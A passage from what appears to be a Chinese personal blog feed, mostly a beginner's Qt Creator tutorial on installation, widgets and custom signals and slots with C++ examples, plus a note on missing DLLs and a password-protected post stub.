id="缺少dll"><a href="#缺少dll" class="headerlink" title="缺少dll"></a>缺少dll</h2><p>这个还真不好说，有些人一开始可能没遇到后面遇到了，建议就是把你使用的qt的msvc的bin目录，添加到系统坏境中。然后重启下电脑才生效。【以后对clion配置也有好处哈哈】</p><ol><li>右击此电脑-属性</li><li>跳到设置-关于之后往下滑，有一个高级系统设置</li><li>打开之后右下角有一个环境变量</li><li>打开后看到下面的系统变量，找到path，双击，选择新建</li><li>把刚才说的qt的msvc的bin目录复制下来，添加，注意64和86都放进去得了</li></ol><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>其实qt本身也因为比较单调和简略，对于内存还是速度一定程序上比vs是快点。</p><p>最后就是用vs创建的qt是以qmake编译的，qt默认是cmake。我目前还不知道有什么太大区别，先自己用的舒服点吧，以后上班了什么的在看公司要求。</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>qt翻金币小游戏</title>
      <link href="/2021/09/26/qt%E7%BF%BB%E9%87%91%E5%B8%81%E5%B0%8F%E6%B8%B8%E6%88%8F/"/>
      <url>/2021/09/26/qt%E7%BF%BB%E9%87%91%E5%B8%81%E5%B0%8F%E6%B8%B8%E6%88%8F/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="bcd93a6757fce87e1a80385a4f009dab8c8ab6f0dfeb744f1205178ed4d3e1ae"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Qt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件】qt creator</title>
      <link href="/2021/09/06/qt/"/>
      <url>/2021/09/06/qt/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>b站的cpp看的差不多了，得找个方向溜溜。因为看的是黑马的，所以直接看看qt了。好像最后是个翻金币的小游戏。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><p>我是从官网注册了个账号，搞得开源版本<a href="https://www.qt.io/zh-cn/product?hsLang=zh-cn">地址</a><br>下载的话<a href="https://www.qt.io/zh-cn/download">地址</a></p><img src="/2021/09/06/qt/020.png" class=""><p>实际上也有别的方法，比如在清华大学镜像站下或者在官网把下载的连接粘到迅雷去，因为qt的服务器其实还是部署在国外，没有科学道具挺慢的。<br>我这种方法因为都是下的最新的，所以对部分人来说不太适合。<br>所以具体的安装请自行<a href="https://download.qt.io/">百度</a>，百度的教程提到的是分开下的模式。</p><p>吐槽：</p><ol><li>qt的界面对高分辨率显示器不友好，有的时候不太正经，建议下.2的版本稍微好点。除此之外就是两个不同大小的显示器之间切换你就懂了哈哈。。。有些地方不按比例来的</li><li>qt对中文支持很糟糕，尽量避免使用gbk，不然编译可能有点问题，最重要的是安装路径或者文件路径最好都不要带中文</li><li>官方的图晒得都是配合mac的。虽然我在ubuntu也玩过，但是感觉也就那样</li></ol><hr><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>作为图形化框架，当然也能开发非GUI的程序，qt拥有很好的跨平台能力，基于面向对象，一般都是用cpp或者python吧，貌似有Android的支持。暂时用不到。除此之外，qt除了桌面端，对于嵌入式开发也有布局。<br>qt有名的例子：vlc、kde、virtualbox等。<br><strong>注意，咱要用的都是开源版，所以发布的软件一版也都是采用开源协议的，貌似有能闭源的，但是我对那些协议目前不够了解，不敢指手画脚</strong></p><p>微软的mfc虽然也是一个良好的图形化框架，但是微软的尿性基本不开源，所以mfc只能在windows用，到目前为止mfc的项目好像都是老项目了。未来究竟是什么样咱也不知道。</p><hr><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><img src="/2021/09/06/qt/000.png" class=""><p>图形框架最经典的就是拖控件，然后设置id，参数，在到代码上设置。</p><p>除次之外，qt的控件可以通过引入头文件，然后去创建，一般好像比较喜欢用new，然后在析构函数释放。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;widget.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ui_widget.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QPushButton&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Widget::<span class="built_in">Widget</span>(QWidget *parent)</span><br><span class="line">    : <span class="built_in">QWidget</span>(parent)</span><br><span class="line">    , <span class="built_in">ui</span>(<span class="keyword">new</span> Ui::Widget)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;<span class="built_in">setupUi</span>(<span class="keyword">this</span>);</span><br><span class="line">    QPushButton* btn = <span class="keyword">new</span> QPushButton;</span><br><span class="line">    btn-&gt;<span class="built_in">setText</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    btn-&gt;<span class="built_in">setParent</span>(<span class="keyword">this</span>);</span><br><span class="line">    btn-&gt;<span class="built_in">resize</span>(<span class="number">200</span>,<span class="number">250</span>);</span><br><span class="line">    btn-&gt;<span class="built_in">move</span>(<span class="number">100</span>,<span class="number">200</span>);</span><br><span class="line">    btn-&gt;<span class="built_in">show</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Widget::~<span class="built_in">Widget</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span> ui;</span><br><span class="line">    <span class="keyword">delete</span> btn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2021/09/06/qt/001.png" class=""><p>哈哈哈，很草率的一个东西。<br><code>QPushButton* btn = new QPushButton;</code>创建一个按钮对象<br><code>btn-&gt;setText(&quot;hello&quot;);</code>给按钮设置文本<br><code>btn-&gt;setParent(this);</code>设置父类，咱这在widget这个窗口下，就以他为大爹。<br><code>btn-&gt;resize(200,250);</code>resize就是设置大小很好理解<br><code>btn-&gt;move(100,200);</code>move就是在这个父类窗口中通过xy的偏移得到。<br><code>btn-&gt;show();</code>最后show，显示出来。</p><p>可能会好奇为什么要在这个widget函数里面设置和显示，包括销毁也要在widget的析构函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;QtWidgetsApplication1.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QtWidgets/QApplication&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">QApplication <span class="title">a</span><span class="params">(argc, argv)</span></span>;</span><br><span class="line">    QtWidgetsApplication1 w;</span><br><span class="line">    w.<span class="built_in">show</span>();</span><br><span class="line">    <span class="keyword">return</span> a.<span class="built_in">exec</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于qt项目的<code>main.cpp</code>，咱可以看到他是创建一个对象的，然后把w.show，这就是我们widget这个主窗口。</p><blockquote><p>widget主要是在上面放置布局和控件；所有用户界面对象的基类。<br>窗口部件是用户界面的一个基本单元：它从窗口系统接收鼠标、键盘和其它事件，并且在屏幕上&gt; 绘制自己。每一个窗口部件都是矩形的，并且它们按Z轴顺序排列。一个窗口部件可以被它的父窗口部件或者它前面的窗口部件盖住一部分</p></blockquote><blockquote><p>mainwindow可以有menu菜单、tool工具栏、status状态栏、电脑显示屏右下脚的托盘等。提供更好的可视化操作；一个正常window软件呈现给客户的可视化界面。</p></blockquote><p>当然关于qt他自己是有帮助文档的</p><img src="/2021/09/06/qt/002.png" class=""><p>额虽然大概率新手看不懂，不如直接看视频或者百度哈。</p><hr><h2 id="拖拽控件"><a href="#拖拽控件" class="headerlink" title="拖拽控件"></a>拖拽控件</h2><p>额关于其他控件，b站啥的看一下就行了，文字说明没啥灵魂的。<br>而且控件类型也不少，建议视频教学。</p><hr><h2 id="信号和槽"><a href="#信号和槽" class="headerlink" title="信号和槽"></a>信号和槽</h2><p>这个可以说是qt的精髓了，有了信号和槽，对设计者可以更直观的操作组件交互。</p><h3 id="信号-Signal"><a href="#信号-Signal" class="headerlink" title="信号(Signal)"></a>信号(Signal)</h3><p>信号会在特定的情况下发生的事件，咱最常见的PushButton，他最常见的信号就是来自鼠标的点击时发送的<code>clicked()</code>信号，一个combobox最常见的就是选择列表项时列表发生改变的<code>CurrentIndexChanged()</code>信号<br>对于GUI程序设计主要是整合各组件信号的响应，合理的去安排什么时候发送信号。</p><h3 id="槽-Slot"><a href="#槽-Slot" class="headerlink" title="槽(Slot)"></a>槽(Slot)</h3><p>信号是发送的，那么槽就是用来接收响应的。表现形式就是一个函数，与一般c++函数差不多，也可以封装到类里面。<br>槽可以有参数，也可以被直接调用，与一般的函数不同处就是槽可以与一个信号关联，信号发射时，关联的这个槽会自动触发。</p><p>信号和槽关联通过<code>QObject::connect()函数实现</code><br>基本格式示例<code>QObject::connect(sender, SIGNAL(signal()), receiver, SLOT(sloet()));</code></p><ul><li>参数1表示信号发送者</li><li>参数2表示发送的信号</li><li>参数3表示信号的接收者</li><li>参数4表示信号处理(槽)函数</li></ul><p>最简单的使用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QMetaObject::Connection ret = <span class="built_in">connect</span>(btn, &amp;QPushButton::clicked, <span class="keyword">this</span>, &amp;Widget::close);</span><br></pre></td></tr></table></figure><p>以咱前面的那个例子，此处的操作主要就是通过btn按钮，触发点击事件之后，把这个父类窗口直接关闭。</p><p><strong>注意的是，咱这里是通过自带的点击事件和窗口自带的关闭事件响应</strong></p><p>如果不知道可以百度，或者打开qt助手搜索查看一下，qt助手的路径为<code>qt安装目录下/版本号/比如mingw或者mscv，32位还是64位看你自己选择/bin/assistant.exe</code><br>可能这样描述有些人看不懂，例如我使用的msvc2019，那么路径应该是<code>D:\Qt\5.15.2\msvc2019\bin\assistant.exe</code></p><p>打开后是这样的</p><img src="/2021/09/06/qt/003.png" class=""><h3 id="如何自定义信号和槽"><a href="#如何自定义信号和槽" class="headerlink" title="如何自定义信号和槽"></a>如何自定义信号和槽</h3><p>先创建俩类</p><img src="/2021/09/06/qt/004.png" class=""><p>一个boy，一个gril，信号是love，槽就是ack_love哈哈</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//boy.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BOY_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOY_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QObject&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">boy</span> : <span class="keyword">public</span> QObject</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">boy</span><span class="params">(QObject *parent = <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">signals:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">love</span><span class="params">()</span></span>;    <span class="comment">//信号</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// BOY_H</span></span></span><br></pre></td></tr></table></figure><p><strong>qt的信号是可以不实现的，与原本的cpp有一点相违背，但是我们自己能理解就行，毕竟这个只是一个触发点，调用了这个就相当于发射了信号，内部有无实现并不重要</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gril.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> GRIL_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GRIL_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QObject&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">gril</span> : <span class="keyword">public</span> QObject</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">gril</span><span class="params">(QObject *parent = <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">signals:</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> slots:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">ack_love</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// GRIL_H</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gril.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gril.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QDebug&gt;</span></span></span><br><span class="line"></span><br><span class="line">gril::<span class="built_in">gril</span>(QObject *parent)</span><br><span class="line">    : QObject&#123;parent&#125;</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gril::ack_love</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;不听不听王八念经&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>槽函数是肯定要实现的，不然鬼知道它有没有响应</strong></p><p>然后设计完了，该在哪调用。<br>首先咱用不到按钮，但是还是要承载在主窗口，主窗口是在main.cpp完成创建的，所以咱可以直接在main.cpp就开始，当然在窗口里面写其实问题也不大，关联this就行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Widget w;</span><br><span class="line"><span class="function">boy <span class="title">x_ming</span><span class="params">(&amp;w)</span></span>;</span><br><span class="line"><span class="function">gril <span class="title">x_hong</span><span class="params">(&amp;w)</span></span>;</span><br><span class="line">w.<span class="built_in">connect</span>(&amp;x_ming, &amp;boy::love, &amp;x_hong, &amp;gril::ack_love);</span><br><span class="line">w.<span class="built_in">show</span>();</span><br><span class="line">x_ming.<span class="built_in">love</span>();</span><br></pre></td></tr></table></figure><img src="/2021/09/06/qt/005.png" class=""><p>当我们启动的时候，在下面可以看到有输出，而且代码除了connect以外，并没有调用ack_love，说明通过love信号，的确触发了ack_love槽来响应。</p><blockquote><p>关于qdebug，我们不可能直接把文字输出到窗口里吧，想搞也行，但肯定要个文本控件。最简单的就是当然调试信息直接打印在调试框里</p></blockquote><p>所以对于信号</p><ol><li>要声明在头文件的signals下</li><li>信号函数只需要声明，不需要实现</li><li>信号函数必须是void类型，都不要实现了自然也不用你返回值啥的</li><li>信号函数可以有参数，可以重载</li><li>调用信号的时候，可以在前面加一个<code>emit</code>，新版其实加不加都问题不大，还是那句话方便区分</li></ol><blockquote><p>老版本应该是指qt4了吧，现今都是qt5，未来还有qt6，虽然不知道具体差异</p></blockquote><p>对于槽</p><ol><li>槽函数不能写到signals下面，你要写在public slots下面，新版的好像可以不写slots，但是写了主要是明确直观的</li><li>槽函数除了声明还得去实现</li><li>槽函数也是void类型</li><li>也可以有参数和重载，但是大部分情况应该不会用到</li></ol><hr><h3 id="自定义信号带参数和重载"><a href="#自定义信号带参数和重载" class="headerlink" title="自定义信号带参数和重载"></a>自定义信号带参数和重载</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//boy.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BOY_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOY_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QObject&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">boy</span> : <span class="keyword">public</span> QObject</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">boy</span><span class="params">(QObject *parent = <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">signals:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">love</span><span class="params">()</span></span>;    <span class="comment">//信号</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">love</span><span class="params">(QString str)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// BOY_H</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gril.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> GRIL_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GRIL_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QObject&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">gril</span> : <span class="keyword">public</span> QObject</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">gril</span><span class="params">(QObject *parent = <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">signals:</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> slots:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">ack_love</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">ack_love</span><span class="params">(QString str)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// GRIL_H</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gril.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gril.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QDebug&gt;</span></span></span><br><span class="line"></span><br><span class="line">gril::<span class="built_in">gril</span>(QObject *parent)</span><br><span class="line">    : QObject&#123;parent&#125;</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gril::ack_love</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;不听不听王八念经&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gril::ack_love</span><span class="params">(QString str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;男孩:&quot;</span> &lt;&lt; str &lt;&lt; <span class="string">&quot; 女孩:hai&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意，此处编译是不通过的，因为涉及到函数重载，而connect却没有指明</strong></p><p>随机补充几个点<br>cpp补充重载</p><ol><li>函数名相同，带有不同参数（个数和类型），这样的函数构成重载</li><li>作用域要相同，比如同个类，同个源文件</li><li>重载与返回类型可同可不同，不重要</li></ol><p>cpp补充重写</p><ol><li>其实就是类中函数被定义为虚函数了，子类或者派生类继承之后重写了它</li><li>参数列表必须与父类的结构完全一致</li><li>派生类重写之后函数前缀可不加<code>virtual</code>关键字</li></ol><p>那么如何解决，有两个办法，但都涉及函数指针，因为地址是最好分别的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">QApplication <span class="title">a</span><span class="params">(argc, argv)</span></span>;</span><br><span class="line">    Widget w;</span><br><span class="line">    <span class="function">boy <span class="title">x_ming</span><span class="params">(&amp;w)</span></span>;</span><br><span class="line">    <span class="function">gril <span class="title">x_hong</span><span class="params">(&amp;w)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">void</span>(boy::*pLove)(QString) = &amp;boy::love;</span><br><span class="line">    <span class="built_in">void</span>(gril::*pAck)(QString) = &amp;gril::ack_love;</span><br><span class="line">    w.<span class="built_in">connect</span>(&amp;x_ming, pLove, &amp;x_hong, pAck);</span><br><span class="line">    w.<span class="built_in">show</span>();</span><br><span class="line">    x_ming.<span class="built_in">love</span>();</span><br><span class="line">    <span class="keyword">return</span> a.<span class="built_in">exec</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当函数指针带参数，执行我们类中的函数他会自己匹配上。</p><p>哦刚才run的时候发现没输出，一看是lov忘记填字符串了哈哈。随便填一下<code>x_ming.love(&quot;你好&quot;);</code></p><img src="/2021/09/06/qt/006.png" class=""><p>然后就可以看到有输出了。</p><p>另外一种也类似<br><code>w.connect(&amp;x_ming,(void(boy::*)(QString))&amp;boy::love, &amp;x_hong,(void(gril::*)(QString))&amp;gril::ack_love);</code></p><p>相对而言他就是强制转换了这个函数为这个带参数类型的那个，虽然效果一样，但是代码的可读性差很多。所以并不推荐这种方式。</p><hr><h3 id="信号和槽的拓展"><a href="#信号和槽的拓展" class="headerlink" title="信号和槽的拓展"></a>信号和槽的拓展</h3><p>上述的例子，我们将两个类的信号和槽直接完成关联，那么实际开发中这是一种不可控的情况，并不会被采取，所以是例子！</p><p>最合理的是什么，比如我们说过的pushbutton，他有自带的点击信号，那么就有路数了，给个提示，让btn的点击信号触发。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;boy.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gril.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;widget.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QApplication&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QLocale&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QPushButton&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QTranslator&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">QApplication <span class="title">a</span><span class="params">(argc, argv)</span></span>;</span><br><span class="line"></span><br><span class="line">    Widget w;</span><br><span class="line">    QPushButton btn;</span><br><span class="line">    btn.<span class="built_in">setParent</span>(&amp;w);</span><br><span class="line">    btn.<span class="built_in">setText</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="function">boy <span class="title">x_ming</span><span class="params">(&amp;w)</span></span>;</span><br><span class="line">    <span class="function">gril <span class="title">x_hong</span><span class="params">(&amp;w)</span></span>;</span><br><span class="line">    <span class="built_in">void</span>(boy::*pLove)() = &amp;boy::love;</span><br><span class="line">    <span class="built_in">void</span>(gril::*pAck)() = &amp;gril::ack_love;</span><br><span class="line">    w.<span class="built_in">connect</span>(&amp;btn, &amp;QPushButton::clicked, &amp;x_ming, pLove);</span><br><span class="line">    w.<span class="built_in">connect</span>(&amp;x_ming, pLove, 